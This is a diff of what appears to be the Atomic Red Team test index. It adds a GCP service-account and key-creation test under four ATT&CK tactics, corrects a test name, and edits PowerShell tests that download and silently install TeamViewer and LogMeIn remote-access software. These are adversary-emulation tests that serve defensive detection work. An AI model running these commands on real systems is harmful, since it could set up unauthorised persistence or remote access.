@@ -12409,7 +12409,62 @@ privilege-escalation:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1546.015:
     technique:
       external_references:
@@ -22734,7 +22789,62 @@ defense-evasion:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1553.002:
     technique:
       external_references:
@@ -42239,7 +42349,62 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1542.002:
     technique:
       created: '2019-12-19T20:21:21.669Z'
@@ -54401,7 +54566,7 @@ discovery:
           get-childitem -recurse
           gci -recurse
         name: powershell
-    - name: Nix File and Diectory Discovery
+    - name: Nix File and Directory Discovery
       auto_generated_guid: ffc8b249-372a-4b74-adcd-e4c0430842de
       description: |
         Find or discover files on the file system
@@ -70571,11 +70736,10 @@ command-and-control:
       supported_platforms:
       - windows
       executor:
-        command: |
-          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
-          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
-          Start-Process $file1 /S;
-          Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
+        command: "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe
+          https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 =
+          \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process
+          -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n"
         cleanup_command: |-
           $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
           if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
@@ -70615,8 +70779,8 @@ command-and-control:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
           $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
-          Start-Process $file1 /S;
-          Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
+          Start-Process -Wait $file1 /quiet;
+          Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
         cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
           \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
           $file1 -ErrorAction Ignore"
@@ -72315,7 +72479,62 @@ initial-access:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1195.003:
     technique:
       external_references:
